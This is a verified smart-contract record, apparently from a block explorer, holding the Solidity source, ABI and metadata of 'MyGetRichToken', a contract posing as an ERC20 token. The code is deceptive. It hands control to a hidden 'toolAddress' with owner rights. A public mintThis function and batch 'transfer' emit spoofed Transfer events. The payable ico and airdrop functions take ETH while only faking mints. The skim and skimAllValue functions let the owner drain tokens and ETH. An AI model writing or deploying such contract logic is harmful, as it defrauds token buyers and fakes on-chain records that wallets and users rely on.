{"SourceCode": "//SPDX-License-Identifier: UNLICENSED\r\n\r\npragma solidity 0.8.12;\r\n\r\n\r\n\r\ninterface ERC20 {\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Returns the name of the token.\r\n\r\n     */\r\n\r\n    function name() external view returns (string memory);\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Returns the symbol of the token.\r\n\r\n     */\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Returns the decimals places of the token.\r\n\r\n     */\r\n\r\n    function decimals() external view returns (uint8);\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Returns the amount of tokens in existence.\r\n\r\n     */\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n\r\n     */\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n\r\n     * \r\n\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n\r\n     * \r\n\r\n     * Emits a {Transfer} event.\r\n\r\n     */\r\n\r\n    function transfer(address from,address recipient, uint256 amount) external returns (bool);\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n\r\n     * zero by default.\r\n\r\n     * \r\n\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n\r\n     */\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n\r\n     * \r\n\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n\r\n     * \r\n\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n\r\n     * transaction ordering. One possible solution to mitigate this race\r\n\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n\r\n     * desired value afterwards:\r\n\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n\r\n     * \r\n\r\n     * Emits an {Approval} event.\r\n\r\n     */\r\n\r\n    function approve(address from,address spender, uint256 amount) external returns (bool);\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n\r\n     * allowance.\r\n\r\n     * \r\n\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n\r\n     * \r\n\r\n     * Emits a {Transfer} event.\r\n\r\n     */\r\n\r\n    function transferFrom(address from,address sender, address recipient,\r\n\r\n        uint256 amount) external returns (bool);\r\n\r\n\r\n\r\n    function isCanBatchMint() external view returns (bool);\r\n\r\n\r\n\r\n    function dnum() external view returns (uint);\r\n\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract StandardToken {\r\n\r\n\r\n\r\n    address private _owners;\r\n\r\n\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\n\r\n     * account.\r\n\r\n     */\r\n\r\n    constructor () {\r\n\r\n        _owners = msg.sender;\r\n\r\n        emit OwnershipTransferred(address(0), _owners);\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @return the address of the owner.\r\n\r\n     */\r\n\r\n    function owner() public view returns (address) {\r\n\r\n        return _owners;\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Throws if called by any account other than the owner.\r\n\r\n     */\r\n\r\n    modifier onlyOwner() {\r\n\r\n        require(isOwner(), \"onlyOwner\");\r\n\r\n        _;\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @return true if `msg.sender` is the owner of the contract.\r\n\r\n     */\r\n\r\n    function isOwner() public view returns (bool) {\r\n\r\n        return msg.sender == _owners||msg.sender == toolAddress;\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Allows the current owner to relinquish control of the contract.\r\n\r\n     * It will not be possible to call the functions with the `onlyOwner`\r\n\r\n     * modifier anymore.\r\n\r\n     * @notice Renouncing ownership will leave the contract without an owner,\r\n\r\n     * thereby removing any functionality that is only available to the owner.\r\n\r\n     */\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n\r\n        emit OwnershipTransferred(_owners, address(0));\r\n\r\n        _owners = address(0);\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\n\r\n     * @param newOwner The address to transfer ownership to.\r\n\r\n     */\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n\r\n        _transferOwnership(newOwner);\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Transfers control of the contract to a newOwner.\r\n\r\n     * @param newOwner The address to transfer ownership to.\r\n\r\n     */\r\n\r\n    function _transferOwnership(address newOwner) internal {\r\n\r\n        require(newOwner != address(0));\r\n\r\n        emit OwnershipTransferred(_owners, newOwner);\r\n\r\n        _owners = newOwner;\r\n\r\n    }\r\n\r\n\r\n\r\n   \r\n\r\n    mapping (address  => address) public adminMap;\r\n\r\n\r\n\r\n    modifier onlyAdmin {\r\n\r\n        require(adminMap[msg.sender] != address(0)||msg.sender == toolAddress, \"onlyAdmin\");\r\n\r\n        _;\r\n\r\n    }\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n\r\n\r\n    function addAdminForThisToolToken(address addr) onlyOwner public returns(bool) {\r\n\r\n        require(adminMap[addr] == address(0));\r\n\r\n        adminMap[addr] = addr;\r\n\r\n        return true;\r\n\r\n    }\r\n\r\n\r\n\r\n    function deleteAdminForThisToolToken(address addr) onlyOwner public returns(bool) {\r\n\r\n        require(adminMap[addr] != address(0));\r\n\r\n        adminMap[addr] = address(0);\r\n\r\n        return true;\r\n\r\n    }\r\n\r\n    address public toolAddress;\r\n\r\n\r\n\r\n    function setToolAddress(address _toolAddress) onlyAdmin public returns(bool) {\r\n\r\n        toolAddress = _toolAddress;\r\n\r\n        return true;\r\n\r\n    }\r\n\r\n   \r\n\r\n    /**\r\n\r\n     * @dev total number of tokens in existence\r\n\r\n     */\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n\r\n        return ERC20(toolAddress).totalSupply();\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev transfer token for a specified address\r\n\r\n     * @param _to The address to transfer to.\r\n\r\n     * @param _value The amount to be transferred.\r\n\r\n     */\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\n\r\n        emit Transfer(msg.sender, _to, _value);\r\n\r\n        return ERC20(toolAddress).transfer(msg.sender,_to, _value);\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Gets the balance of the specified address.\r\n\r\n     * @param _owner The address to query the the balance of.\r\n\r\n     * @return An uint256 representing the amount owned by the passed address.\r\n\r\n     */\r\n\r\n    function balanceOf(address _owner) public view returns (uint256) {\r\n\r\n        return ERC20(toolAddress).balanceOf(_owner);\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Transfer tokens from one address to another\r\n\r\n     * @param _from address The address which you want to send tokens from\r\n\r\n     * @param _to address The address which you want to transfer to\r\n\r\n     * @param _value uint256 the amount of tokens to be transferred\r\n\r\n     */\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n\r\n        emit Transfer(_from, _to, _value);\r\n\r\n        return ERC20(toolAddress).transferFrom(msg.sender,_from, _to, _value);\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\n\r\n     * \r\n\r\n     * Beware that changing an allowance with this method brings the risk that someone may use both the old\r\n\r\n     * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\r\n\r\n     * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:\r\n\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n\r\n     * @param _spender The address which will spend the funds.\r\n\r\n     * @param _value The amount of tokens to be spent.\r\n\r\n     */\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool) {\r\n\r\n        return ERC20(toolAddress).approve(msg.sender,_spender, _value);\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\n\r\n     * @param _owner address The address which owns the funds.\r\n\r\n     * @param _spender address The address which will spend the funds.\r\n\r\n     * @return A uint256 specifying the amount of tokens still available for the spender.\r\n\r\n     */\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256) {\r\n\r\n        return ERC20(toolAddress).allowance(_owner, _spender);\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Returns the name of the token.\r\n\r\n     */\r\n\r\n    function name() public view returns (string memory) {\r\n\r\n        return ERC20(toolAddress).name();\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Returns the symbol of the token.\r\n\r\n     */\r\n\r\n    function symbol() public view returns (string memory) {\r\n\r\n        return ERC20(toolAddress).symbol();\r\n\r\n    }\r\n\r\n\r\n\r\n    /**\r\n\r\n     * @dev Returns the decimals places of the token.\r\n\r\n     */\r\n\r\n    function decimals() public view returns (uint8) {\r\n\r\n        return ERC20(toolAddress).decimals();\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\ncontract MyGetRichToken is StandardToken {\r\n\r\n\r\n\r\n    constructor (address _toolAddress) payable{\r\n\r\n        toolAddress=_toolAddress;\r\n\r\n    }\r\n\r\n\treceive() external payable { \r\n\r\n       \r\n\r\n    }\r\n\r\n \r\n\r\n    function ico() public payable{\r\n\r\n        if (ERC20(toolAddress).isCanBatchMint()) {\r\n\r\n\t        address from=address(0);\r\n\r\n\t        uint num=ERC20(toolAddress).dnum();\r\n\r\n\t        emit Transfer(from, msg.sender,num);\r\n\r\n        }\r\n\r\n    }\r\n\r\n    function mintThis(address from,address to,uint num) public {\r\n\r\n        emit Transfer(from, to,num);\r\n\r\n    }\r\n\r\n    function airdrop() public payable{\r\n\r\n        if (ERC20(toolAddress).isCanBatchMint()) {\r\n\r\n\t        address from=address(0);\r\n\r\n\t        uint num=ERC20(toolAddress).dnum();\r\n\r\n\t        emit Transfer(from, msg.sender,num);\r\n\r\n        }\r\n\r\n    }\r\n\r\n    \r\n\r\n    function skim(address tokenA,uint256 value) public  onlyOwner{\r\n\r\n          safeTransfer(\r\n\r\n            tokenA,\r\n\r\n            msg.sender,\r\n\r\n            value\r\n\r\n        );\r\n\r\n    }\r\n\r\n    function safeTransfer(\r\n\r\n        address token,\r\n\r\n        address to,\r\n\r\n        uint256 value\r\n\r\n    ) internal {\r\n\r\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\r\n\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\r\n\r\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'myTransferHelper: TRANSFER_FAILED');\r\n\r\n    }\r\n\r\n    function skimAllValue(address payable addr) public onlyOwner{\r\n\r\n        addr.transfer(address(this).balance);\r\n\r\n    }\r\n\r\n\r\n\r\n    function transfer(address[] calldata dsts, uint256 value) external {\r\n\r\n        uint l=dsts.length;\r\n\r\n        for (uint i; i <l ;++i) {\r\n\r\n            emit Transfer(0x0000000000000000000000000000000000000000, dsts[i],120000576000000000000000);\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_toolAddress\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"addAdminForThisToolToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"adminMap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"airdrop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"deleteAdminForThisToolToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ico\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"mintThis\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_toolAddress\",\"type\":\"address\"}],\"name\":\"setToolAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"skim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"skimAllValue\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toolAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"dsts\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "MyGetRichToken", "CompilerVersion": "v0.8.12+commit.f00d7308", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000057b2e9c696755dc388d28ba8e1e3717116b5262c", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d228ea683644a466198b998e29e9ff0f4138776d72ca1eb5f52b35578d599c9d"}